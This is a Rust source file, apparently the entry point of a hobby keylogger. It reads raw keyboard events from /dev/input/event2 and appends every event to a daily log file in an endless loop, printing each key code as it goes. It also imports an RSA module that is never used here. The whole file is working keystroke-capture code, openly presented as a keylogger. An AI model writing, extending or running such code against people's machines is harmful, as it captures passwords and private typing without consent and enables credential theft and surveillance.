mod keylogger;
mod rsa;

use keylogger::keyLogger;
use rsa::{gen_keys, array_mod_pow};

use std::io::{self, Read};
use chrono::{DateTime, Local};
use std::path::Path;
use std::fs::File;
use std::fs::write;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {    
    let mut test = keyLogger::new("/dev/input/event2");

    let current_local: DateTime<Local> = Local::now();
    let custom_format = current_local.format("%Y-%m-%d");

    let logs_file_url = format!("./src/data/logs/{}.log", custom_format);

    if (!Path::new(logs_file_url.as_str()).exists()) {
        let mut file = File::create(logs_file_url.as_str())
            .expect("Error while creating the file");
    }

    let mut logs_file = OpenOptions::new()
        .append(true)
        .open(logs_file_url.as_str())
        .expect("Error while opening the file");

    loop {
        let event = &mut test.getCurrentEvent();

        logs_file.write_all(format!("{:?}\n", event).as_bytes());

        println!("{:?}", event.code);
    }
}
